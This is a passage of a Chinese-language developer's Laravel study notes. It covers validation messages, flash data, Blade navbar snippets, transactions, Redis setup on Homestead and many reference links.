class=\"line\"><span class=\"comment\">// 非正確的時候會導入到首頁，目前找不到修改對應首頁方法，建議用Validator::make</span></span><br><span class=\"line\">$validatedData = $request-&gt;validate([</span><br><span class=\"line\">    <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'required|max:1'</span>,</span><br><span class=\"line\">]);</span><br></pre></td></tr></table></figure>\n<h3 id=\"error-顯示方法\"><a href=\"#error-顯示方法\" class=\"headerlink\" title=\"error 顯示方法\"></a>error 顯示方法</h3><p>redirect()-&gt;withErrors<br>可以抓取到</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">@if ($errors-&gt;any())</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"alert alert-danger\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    @foreach ($errors-&gt;all() as $error)</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>&#123;&#123; $error &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    @endforeach</span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>正如前面所提到的，Laravel 會自動把使用者重導到先前的位置。另外，所有的驗證錯誤會被自動快閃至 session。<br>同樣的，注意我們不需要在 GET 路由明確的綁定錯誤訊息至視圖。這是因為 Laravel 會自動檢查 session 內的錯誤資料，如果錯誤存在的話，會自動綁定這些錯誤訊息到視圖。所以，請注意到 $errors 變數在每次請求的所有視圖中都將可以使用，讓你可以方便假設 $errors 變數已被定義且可以安全地使用。\\$errors 變數是 Illuminate\\Support\\MessageBag 的實例。有關此物件的詳細資訊，請查閱它的文件。</p>\n</blockquote>\n<h3 id=\"success-方法\"><a href=\"#success-方法\" class=\"headerlink\" title=\"success 方法\"></a>success 方法</h3><p>內建沒有 WithSuccess<br>但還是可以塞自己想要的資料</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> redirect()-&gt;route(<span class=\"string\">'week1.edit'</span>, [<span class=\"string\">'id'</span> =&gt; $id])</span><br><span class=\"line\">    -&gt;with(<span class=\"string\">'success'</span>, <span class=\"string\">'修改成功'</span>);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">@endif @if (session()-&gt;has('succes'))</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"alert alert-primary\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>&#123;&#123; session()-&gt;get('succes') &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">@endif</span><br></pre></td></tr></table></figure>\n<p><strong>上面也可以用<code>@if(isset($success))</code></strong><br>注意with 除了寫 session 他也可以當view 變數名稱</p>\n<h2 id=\"Laravel-有關-with-function-那些事情\"><a href=\"#Laravel-有關-with-function-那些事情\" class=\"headerlink\" title=\"Laravel 有關 with function 那些事情\"></a>Laravel 有關 with function 那些事情</h2><p>一直看書看到有很多地方都有用到 with<br>不仔細看，我還以為他們都是一樣的東西<br>但是用在不同地方還是不一樣</p>\n<h3 id=\"orm-with\"><a href=\"#orm-with\" class=\"headerlink\" title=\"orm with\"></a>orm with</h3><p>之前我有小記，但我沒有用，有空來小記<br><a href=\"https://learnku.com/laravel/t/7778/summary-using-the-laravel-development-tool-the-n-1-problem-of-the-orm-query\" target=\"_blank\" rel=\"noopener\">總結要點：使用 Laravel 開發工具，ORM 查詢的 N + 1 問題 | Laravel China 社區 - 高品質的 Laravel 開發者社區</a></p>\n<h3 id=\"view-with\"><a href=\"#view-with\" class=\"headerlink\" title=\"view with\"></a>view with</h3><p>這個等於 view()第二個參數帶到 blade 去</p>\n<p><a href=\"https://github.com/bestmomo/laravel5-example/tree/master/resources/views/back/blog\" target=\"_blank\" rel=\"noopener\">laravel5-example/resources/views/back/blog at master · bestmomo/laravel5-example</a></p>\n<p>View 資料夾要如何分?<br>目前我只想到 layout ,page<br>但官方沒有限制<br>很多 Project 都不時一樣</p>\n<p><a href=\"https://github.com/bestmomo/laravel5-example/tree/master/resources/views/back/blog\" target=\"_blank\" rel=\"noopener\">laravel5-example/resources/views/back/blog at master · bestmomo/laravel5-example</a></p>\n<h3 id=\"redirect-with\"><a href=\"#redirect-with\" class=\"headerlink\" title=\"redirect with\"></a>redirect with</h3><p>一直以為這個跟 view with 一樣<br>但是看一下原始碼<br>他是存在 session(flashdatg 下一個頁面就會清除) ，可以用 old 快速呼叫<br>原本我以為可以用 create 和 edit 共用同一個 view<br>但發現難度太高，因為 old(‘name’,\\$event-&gt;name)<br>但是在 create 頁面就會掛掉<br>也許我可以在 create 做一個<code>空event</code>?<br>有空試試看</p>\n<p>withErrors 和 withInput 一樣的道理</p>\n<h2 id=\"action-和-route-選擇\"><a href=\"#action-和-route-選擇\" class=\"headerlink\" title=\"action 和 route 選擇\"></a>action 和 route 選擇</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#123; action(<span class=\"string\">'EventController@edit'</span>, [<span class=\"string\">'id'</span>=&gt;<span class=\"number\">1</span>]) &#125;&#125;</span><br><span class=\"line\">&#123;&#123; route(<span class=\"string\">'week1.edit'</span>, [<span class=\"string\">'id'</span>=&gt;<span class=\"number\">1</span>]) &#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>我選擇用 route<br>打很少字，就算之後要換檔名不用修改很多檔案裡面的內容<br>可以算是非常方便</p>\n<h2 id=\"用-Laravel-Mix-記得加-meta-csrf\"><a href=\"#用-Laravel-Mix-記得加-meta-csrf\" class=\"headerlink\" title=\"用 Laravel Mix 記得加 meta csrf\"></a>用 Laravel Mix 記得加 meta csrf</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"csrf-token\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"&#123;&#123; csrf_token() &#125;&#125;\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>Console.log 好心提醒<br>CSRF token not found: <a href=\"https://laravel.com/docs/csrf#csrf-x-csrf-token\" target=\"_blank\" rel=\"noopener\">https://laravel.com/docs/csrf#csrf-x-csrf-token</a></p>\n<h2 id=\"Laravel-5-x-移除-html-helper\"><a href=\"#Laravel-5-x-移除-html-helper\" class=\"headerlink\" title=\"Laravel 5.x 移除 html helper\"></a>Laravel 5.x 移除 html helper</h2><p>不知道為什麼超多人還是有用<br><a href=\"https://segmentfault.com/a/1190000002605467\" target=\"_blank\" rel=\"noopener\">laravel 5 Form 和 HTML 的使用 - 袁超 - SegmentFault 思否</a></p>\n<h2 id=\"DB-ORM-建立交易\"><a href=\"#DB-ORM-建立交易\" class=\"headerlink\" title=\"DB(ORM) 建立交易\"></a>DB(ORM) 建立交易</h2><p>需要抓到外面的變數可以用 use</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">DB::transaction(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> <span class=\"title\">use</span> <span class=\"params\">($input, &amp;$is_save)</span> </span>&#123;</span><br><span class=\"line\">    $event = <span class=\"keyword\">new</span> Event($input);</span><br><span class=\"line\">    $event-&gt;save();</span><br><span class=\"line\">    $event-&gt;sort = $event-&gt;id;</span><br><span class=\"line\">    $is_save = $event-&gt;save();</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://kejyuntw.gitbooks.io/laravel-5-learning-notes/database/model/database-model-eloquent-lock.html\" target=\"_blank\" rel=\"noopener\">鎖定資料 Lock · Laravel 5 學習筆記</a></p>\n<h2 id=\"服務容器\"><a href=\"#服務容器\" class=\"headerlink\" title=\"服務容器\"></a>服務容器</h2><ul>\n<li><a href=\"https://learnku.com/laravel/t/3361/starting-with-the-1-line-of-code-with-a-systematic-understanding-of-the-core-concepts-of-service-container\" target=\"_blank\" rel=\"noopener\">从 1 行代码开始，带你系统性地理解 Service Container 核心概念 | Laravel China 社区</a></li>\n<li><a href=\"https://learnku.com/laravel/t/3361/starting-with-the-1-line-of-code-with-a-systematic-understanding-of-the-core-concepts-of-service-container#%E4%B8%80%E4%B8%AA%E5%9F%BA%E7%A1%80%E7%89%88%E7%9A%84-IOC-Container\" target=\"_blank\" rel=\"noopener\">从 1 行代码开始，带你系统性地理解 Service Container 核心概念 | Laravel China 社区</a></li>\n<li><a href=\"https://learnku.com/articles/789/laravel-learning-notes-the-magic-of-the-service-container\" target=\"_blank\" rel=\"noopener\">Laravel 学习笔记 —— 神奇的服务容器 | Laravel China 社区</a></li>\n</ul>\n<p>以上兩篇我看完小記的觀點，不一定正確，建議還是看裡面的內容。<br>我覺得這幾篇講的名詞都很抽象，所以不是很好懂(但是裡面這幾篇算是我找得最清楚的)<br>先講講我怎麼看裡面容器<br><del>我當初以為所有類別都是容器</del>但其實容器應該就是指<code>Container::getInstance</code>這一段類別</p>\n<p>更深入了解 Ioc 和 DI 意思<br>我覺得可以看下面這邊<br><a href=\"https://notfalse.net/3/ioc-di\" target=\"_blank\" rel=\"noopener\">控制反轉 (IoC) 與 依賴注入 (DI) - NotFalse 技術客</a></p>\n<p>感想<br>看完有種想把所有東西都塞到容器裡面?<br>但我後來想想應該不需要<br>我覺得容器有點像兩個 class 工通橋梁(如 Laravel app())<br>再透過 Facade 或 helper function 更加方便<br>同時兩個類別可以呼叫不同 class bind 後的實例</p>\n<p><a href=\"https://medium.com/mr-efacani-teatime/laravel%E5%A6%82%E4%BD%95%E5%AF%A6%E7%8F%BE%E4%BE%9D%E8%B3%B4%E6%80%A7%E6%B3%A8%E5%85%A5-d760c8e5abde\" target=\"_blank\" rel=\"noopener\">Laravel 如何實現依賴性注入？ - 技術保鮮盒 - Medium</a></p>\n<h3 id=\"Repository\"><a href=\"#Repository\" class=\"headerlink\" title=\"Repository\"></a>Repository</h3><ul>\n<li><p><a href=\"https://laravelacademy.org/post/3063.html\" target=\"_blank\" rel=\"noopener\">在 Laravel 5 中使用 Repository 模式实现业务逻辑和数据访问的分离 - Laravel 学院</a></p>\n</li>\n<li><p><a href=\"https://segmentfault.com/a/1190000003488038\" target=\"_blank\" rel=\"noopener\">为什么你应该使用 Repository - Laravel - SegmentFault 思否</a></p>\n</li>\n<li><p><a href=\"https://www.kancloud.cn/curder/laravel/408484\" target=\"_blank\" rel=\"noopener\">如何使用 Repository 模式 · laravel 学习 · 看云</a></p>\n</li>\n</ul>\n<h2 id=\"factory-seeder\"><a href=\"#factory-seeder\" class=\"headerlink\" title=\"factory /seeder\"></a>factory /seeder</h2><p><a href=\"https://stackoverflow.com/questions/45269146/laravel-seeding-many-to-many-relationship\" target=\"_blank\" rel=\"noopener\">Laravel - Seeding Many-to-Many Relationship - Stack Overflow</a></p>\n<h2 id=\"form-checkbox\"><a href=\"#form-checkbox\" class=\"headerlink\" title=\"form checkbox\"></a>form checkbox</h2><p><a href=\"https://segmentfault.com/q/1010000005107466\" target=\"_blank\" rel=\"noopener\">php - laravel 怎么接收和保存一组 checkbox 到数据库？ - SegmentFault 思否</a></p>\n<h2 id=\"控制器依賴注入原理\"><a href=\"#控制器依賴注入原理\" class=\"headerlink\" title=\"控制器依賴注入原理\"></a>控制器依賴注入原理</h2><ul>\n<li><a href=\"https://medium.com/yish/%E8%87%AA%E8%A8%82%E9%9A%B1%E6%99%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E5%8F%83%E6%95%B8%E6%9F%A5%E8%A9%A2-b4ce73d4df6a\" target=\"_blank\" rel=\"noopener\">自訂隱晦路由器參數查詢 - Yish - Medium</a></li>\n<li><a href=\"https://www.cnblogs.com/springwind2006/p/7780524.html\" target=\"_blank\" rel=\"noopener\">关于 laravel5.5 控制器方法参数依赖注入原理深度解析及问题修复 - 程序人生 ♨︎ - 博客园</a></li>\n</ul>\n<h2 id=\"授權-GATE-amp-Policy\"><a href=\"#授權-GATE-amp-Policy\" class=\"headerlink\" title=\"授權 GATE &amp; Policy\"></a>授權 GATE &amp; Policy</h2><p><a href=\"https://www.cnblogs.com/redirect/p/8658740.html#%E9%80%9A%E8%BF%87%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9E%8B\" target=\"_blank\" rel=\"noopener\">laravel5.5 授权系统 - archer-wong - 博客园</a></p>\n<h2 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h2><p>Laravel 6.2 使用 Redis::get 會遇到<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Please remove or rename the Redis facade alias in your &quot;app&quot; configuration file in order to avoid collision with the PHP Redis extension.</span><br></pre></td></tr></table></figure></p>\n<p>使用 <code>Cache::put</code> 看似能用，但預設 env 是 file，切換到 redis，還是遇到一樣的問題<br>看似 Homestead 預設沒安裝 redis 套件<br>phpredis 需要改裡面程式內容<br>這邊有兩個做法</p>\n<ol>\n<li>改成用 predis 方法(不推薦)</li>\n</ol>\n<p>composer require predis/predis</p>\n<blockquote>\n<p>1 Replace in config\\app.php<br>aliasess:<br>‘Redis’ =&gt; Illuminate\\Support\\Facades\\Redis::class,<br>for:<br>‘RedisManager’ =&gt; Illuminate\\Support\\Facades\\Redis::class,</p>\n<p>2 Replace in config\\database.php</p>\n<p>‘redis’ =&gt; [</p>\n<p>   ‘client’ =&gt; env(‘REDIS_CLIENT’, ‘predis’), //default phpredis<br>   …</p>\n</blockquote>\n<p>參考來源:<a href=\"https://github.com/laravel/horizon/issues/659#issuecomment-528569052\" target=\"_blank\" rel=\"noopener\">https://github.com/laravel/horizon/issues/659#issuecomment-528569052</a></p>\n<ol start=\"2\">\n<li>改成用 phpredis 方法</li>\n</ol>\n<p>Homestead 預設沒有安裝 php redis 套件，所以需要手動安裝<br>不知道新版的 Homestead 會不會預設安裝?<br>可參考:<a href=\"https://learnku.com/articles/33412\" target=\"_blank\" rel=\"noopener\">Homestead 安装 PHP Redis 扩展 | Laravel China 社区</a> <a href=\"/blog/2019/07/16/Laravel-實作小記/web1.png\" title=\"備份圖\">備份圖</a></p>\n<p>相關資料:<br><a href=\"https://segmentfault.com/a/1190000016606114\" target=\"_blank\" rel=\"noopener\">Homestead 安装 PHP Redis 扩展 - 菜园子 - SegmentFault 思否</a><br><a href=\"https://learnku.com/laravel/t/14226/homestead-environment-without-phpize-how-to-install-redis-extension\" target=\"_blank\" rel=\"noopener\">Homestead 环境没有 phpize 怎么安装 Redis 扩展？？？ | Laravel China 社区</a><br><a href=\"https://learnku.com/laravel/t/33538\" target=\"_blank\" rel=\"noopener\">Laravel 6 使用 Redis 注意事项 | Laravel China 社区</a></p>\n<h2 id=\"Laravel-Help\"><a href=\"#Laravel-Help\" class=\"headerlink\" title=\"Laravel Help\"></a>Laravel Help</h2><p><a href=\"https://stackoverflow.com/questions/58163406/after-upgrading-laravel-from-5-6-to-6-0-call-to-undefined-str-random-function\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/questions/58163406/after-upgrading-laravel-from-5-6-to-6-0-call-to-undefined-str-random-function</a></p>\n<h2 id=\"Laravel-Router-多人維護最佳方式\"><a href=\"#Laravel-Router-多人維護最佳方式\" class=\"headerlink\" title=\"Laravel Router 多人維護最佳方式\"></a>Laravel Router 多人維護最佳方式</h2><p><a href=\"https://learnku.com/laravel/t/2484/the-best-way-to-split-routesphp-laravel-routing-file\" target=\"_blank\" rel=\"noopener\">Laravel 分割 routes.php 路由文件的最佳方式 | Laravel China 社区</a></p>\n<h2 id=\"Laravel-blade-Javascript-設計\"><a href=\"#Laravel-blade-Javascript-設計\" class=\"headerlink\" title=\"Laravel blade Javascript 設計\"></a>Laravel blade Javascript 設計</h2><p><a href=\"https://dinos80152.wordpress.com/2015/08/04/laravel-%e8%a8%ad%e8%a8%88%e4%b8%80%e5%80%8b%e5%a5%bd%e7%9a%84-blade-template-%e4%bd%bf%e7%94%a8-parent/\" target=\"_blank\" rel=\"noopener\">Laravel – 設計一個好的 Blade Template, 使用 @parent | 不怕就是強</a></p>\n<p>一般設計<br><a href=\"https://jigsaw.tighten.co/docs/content-blade/\" target=\"_blank\" rel=\"noopener\">Jigsaw – Static Sites for Laravel Developers</a></p>\n<h2 id=\"Laravel-6-安裝-Bootstrap-6\"><a href=\"#Laravel-6-安裝-Bootstrap-6\" class=\"headerlink\" title=\"Laravel 6 安裝 Bootstrap 6\"></a>Laravel 6 安裝 Bootstrap 6</h2><p>composer require laravel/ui –dev</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">// Generate basic scaffolding...</span><br><span class=\"line\">php artisan ui bootstrap</span><br><span class=\"line\">php artisan ui vue</span><br><span class=\"line\">php artisan ui react</span><br><span class=\"line\"></span><br><span class=\"line\">// Generate login / registration scaffolding...</span><br><span class=\"line\">php artisan ui bootstrap --auth</span><br><span class=\"line\">php artisan ui vue --auth</span><br><span class=\"line\">php artisan ui react --auth</span><br></pre></td></tr></table></figure>\n<h2 id=\"blade\"><a href=\"#blade\" class=\"headerlink\" title=\"blade\"></a>blade</h2><h3 id=\"使用-Laravel-Navbar-做-selected-設定\"><a href=\"#使用-Laravel-Navbar-做-selected-設定\" class=\"headerlink\" title=\"使用 Laravel Navbar 做 selected 設定\"></a>使用 Laravel Navbar 做 selected 設定</h3><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"nav nav-second-level\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">\"&#123;&#123; Request::segment(1) === 'programs' ? 'active' : null &#125;&#125;\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"&#123;&#123; url('programs' )&#125;&#125;\"</span> &gt;</span><span class=\"tag\">&lt;/<span class=\"name\">i</span>&gt;</span> Programs<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">\"&#123;&#123; Request::segment(1) === 'beneficiaries' ? 'active' : null &#125;&#125;\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"&#123;&#123;url('beneficiaries')&#125;&#125;\"</span>&gt;</span> Beneficiaries<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">\"&#123;&#123; Request::segment(1) === 'indicators' ? 'active' : null &#125;&#125;\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"&#123;&#123;url('indicators')&#125;&#125;\"</span>&gt;</span> Indicators<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>or<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container-fluid\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"navbar-header\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"navbar-brand\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span>&gt;</span>WebSiteName<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"nav navbar-nav\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">\"&#123;&#123;Request::is('/')?'active':''&#125;&#125;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"&#123;&#123;url('/')&#125;&#125;\"</span>&gt;</span>Home<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">\"&#123;&#123;Request::is('/page1')?'active':''&#125;&#125;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"&#123;&#123;url('/page1')&#125;&#125;\"</span>&gt;</span>Page 1<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">\"&#123;&#123;Request::is('/page2')?'active':''&#125;&#125;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"&#123;&#123;url('/page2')&#125;&#125;\"</span>&gt;</span>Page 2<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">\"&#123;&#123;Request::is('/page3')?'active':''&#125;&#125;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"&#123;&#123;url('/page3')&#125;&#125;\"</span>&gt;</span>Page 3<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">nav</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/29837555/setting-bootstrap-navbar-active-class-in-laravel-5\" target=\"_blank\" rel=\"noopener\">php - Setting Bootstrap navbar active class in Laravel 5 - Stack Overflow</a></li>\n<li><a href=\"https://www.scoopism.com/bootstrap/how-to-set-bootstrap-navbar-class-active/\" target=\"_blank\" rel=\"noopener\">how to set bootstrap navbar class active - Scoopism</a></li>\n</ul>\n<h3 id=\"blade-section-show\"><a href=\"#blade-section-show\" class=\"headerlink\" title=\"blade section/show\"></a>blade section/show</h3><blockquote>\n<ol start=\"2\">\n<li>使用 @section (‘yourSectionName’).....@show。子子孫孫都使用 @section (‘contents’)......@endsection 去繼承實現。</li>\n</ol>\n</blockquote>\n<p><a href=\"https://learnku.com/laravel/t/13853/an-analysis-of-the-usage-of-at-section-at-show-at-section-at-endsection\" target=\"_blank\" rel=\"noopener\">關於 @section...@show;@section....@endsection 的用法分析 | Laravel China 社區</a></p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><ul>\n<li><a href=\"https://segmentfault.com/q/1010000009649587/\" target=\"_blank\" rel=\"noopener\">php - prepare 与 sql 的开销？ - SegmentFault 思否</a></li>\n<li><a href=\"https://www.cnblogs.com/billyxp/p/3631242.html\" target=\"_blank\" rel=\"noopener\">使用 batch insert 解决 MySQL 的 insert 吞吐量问题 - billy 鹏 - 博客园</a><br><a href=\"https://stackoverflow.com/questions/25139948/laravel-eloquent-compare-date-from-datetime-field\" target=\"_blank\" rel=\"noopener\">php - Laravel Eloquent compare date from datetime field - Stack Overflow</a></li>\n<li><a href=\"http://www.111cn.net/phper/php/58561.htm\" target=\"_blank\" rel=\"noopener\">php 下 foreach()错误提示 Warning: Invalid argument supplied for foreach()_一聚教程网</a></li>\n<li><a href=\"https://blog.csdn.net/fdipzone/article/details/78659784\" target=\"_blank\" rel=\"noopener\">php 出现 Warning: A non-numeric value encountered 问题的原因及解决方法 - 傲雪星枫 - CSDN 博客</a><br>pjax</li>\n</ul>\n<h3 id=\"CDN\"><a href=\"#CDN\" class=\"headerlink\" title=\"CDN\"></a>CDN</h3><p><a href=\"https://developer.qiniu.com/fusion/kb/1325/refresh-the-cache-and-the-effect-of-time\" target=\"_blank\" rel=\"noopener\">刷新缓存的方法 - 七牛开发者中心</a></p>\n<ul>\n<li><a href=\"https://zhidao.baidu.com/question/1577731103328450940.html\" target=\"_blank\" rel=\"noopener\">app 接口设计 token 过期怎么使用_百度知道</a></li>\n<li><a href=\"https://stackoverflow.com/questions/9973555/setting-max-input-vars-php-ini-directive-using-ini-set\" target=\"_blank\" rel=\"noopener\">php ini - setting max_input_vars PHP.ini directive using ini_set - Stack Overflow</a></li>\n<li><a href=\"https://www.latech.tw/2017/02/laravel-migrationmodeldb.html\" target=\"_blank\" rel=\"noopener\">Laravel Migration、Model、DB 物件 相關操作 (濃縮) - La Tech.</a></li>\n<li><a href=\"https://www.cnblogs.com/gongxr/p/9522698.html\" target=\"_blank\" rel=\"noopener\">Redis 禁用 FLUSHALL FLUSHDB KEYS 命令 - 星瑞 - 博客园</a></li>\n<li><a href=\"https://www.awaimai.com/2615.html\" target=\"_blank\" rel=\"noopener\">Docker 使用 cron 定时任务 - 歪麦博客</a></li>\n<li><a href=\"https://blog.csdn.net/Coder_Chang/article/details/78815589\" target=\"_blank\" rel=\"noopener\">Laravel 模型关联 attach,save,sync 方法参数类型验证 - Coder_Chang 的博客 - CSDN 博客</a></li>\n<li><a href=\"https://learnku.com/laravel/t/17375\" target=\"_blank\" rel=\"noopener\">associate 的意义？ | Laravel China 社区</a></li>\n<li><a href=\"https://g8787856.github.io/2018/06/30/laravel-passport/\" target=\"_blank\" rel=\"noopener\">Laravel_使用 Passport 寫 API - 總有一天我要當超人</a></li>\n</ul>\n<p><a href=\"https://stackoverflow.com/questions/42950104/how-to-save-in-a-polymorphic-relationship-in-laravel\" target=\"_blank\" rel=\"noopener\">php - How to save in a polymorphic relationship in Laravel? - Stack Overflow</a><br><a href=\"https://laracasts.com/discuss/channels/eloquent/save-on-polymorphic-relation-dont-work\" target=\"_blank\" rel=\"noopener\">save() on polymorphic relation don’t work</a></p>\n<p><a href=\"https://learnku.com/docs/nova/1.0/model-association/2191#searchable-relations\" target=\"_blank\" rel=\"noopener\">模型关联 | 《Laravel Nova 中文文档》</a><br><a href=\"https://github.com/laravel/framework/issues/11918\" target=\"_blank\" rel=\"noopener\">[5.1] Saving morphTo relation. · Issue #11918 · laravel/framework</a><br><a href=\"https://learnku.com/articles/6874/the-legend-of-eloquent-relations\" target=\"_blank\" rel=\"noopener\">Eloquent 关系图例（译） | Laravel China 社区</a><br><a href=\"https://blog.csdn.net/lbwo001/article/details/53063867\" target=\"_blank\" rel=\"noopener\">laravel Carbon 函数 - 醒来明月 - CSDN 博客</a><br><a href=\"https://blog.techbridge.cc/2019/06/29/how-to-build-kubernetes-k8s-cronjob-crawler/\" target=\"_blank\" rel=\"noopener\">如何使用 K8S 自動化定期 CronJob 抓網路公開資料 | TechBridge 技術共筆部落格</a><br><a href=\"https://blog.csdn.net/hxpjava1/article/details/79815015\" target=\"_blank\" rel=\"noopener\">Kubernetes 中的 Job 和 CronJob，批量任务执行 - mark’s technic world - CSDN 博客</a><br><a href=\"https://github.com/onlinereadbook/bookdocker\" target=\"_blank\" rel=\"noopener\">onlinereadbook/bookdocker: 線上 docker 讀書會</a><br><a href=\"https://blog.johnsonlu.org/repository-pattern-and-service-layer/\" target=\"_blank\" rel=\"noopener\">Repository Pattern and Service Layer – 佛祖球球</a><br><a href=\"https://devs.tw/post/328\" target=\"_blank\" rel=\"noopener\">Laravel、Ruby on Rails、Django … 使用 Active Record Pattern 框架的最大問題：到底該把 save 寫在哪裡？ – Devs.tw</a><br><a href=\"http://blog.turn.tw/?p=2992\" target=\"_blank\" rel=\"noopener\">批評 Active Record 的13個論點：最好用也最危險的 Anti-pattern | 